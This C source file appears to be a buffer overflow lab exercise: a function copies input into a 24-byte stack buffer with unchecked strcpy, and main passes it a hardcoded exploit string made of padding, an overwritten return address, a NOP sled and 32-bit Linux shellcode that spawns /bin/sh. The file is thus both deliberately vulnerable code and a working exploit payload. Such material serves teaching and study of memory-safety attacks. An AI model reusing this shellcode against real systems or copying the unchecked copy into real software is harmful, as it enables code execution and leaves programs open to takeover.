/* vulnerable1.c */

/* This program has a buffer overflow vulnerability. */
/* Our task is to exploit this vulnerability */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>



int bof(char *str)
{
    char buffer[24];
     
    /* The following statement has a buffer overflow problem */ 
    strcpy(buffer, str);
    

    return 1;
}

int main(int argc, char **argv)
{
    //char str[517];
    //FILE *badfile;

    //badfile = fopen("badfile", "r");
    //fread(str, sizeof(char), 517, badfile);
    
   
    bof("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xcc\xf3\xff\xbf\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80");

    printf("Returned Properly\n");
    return 1;
}
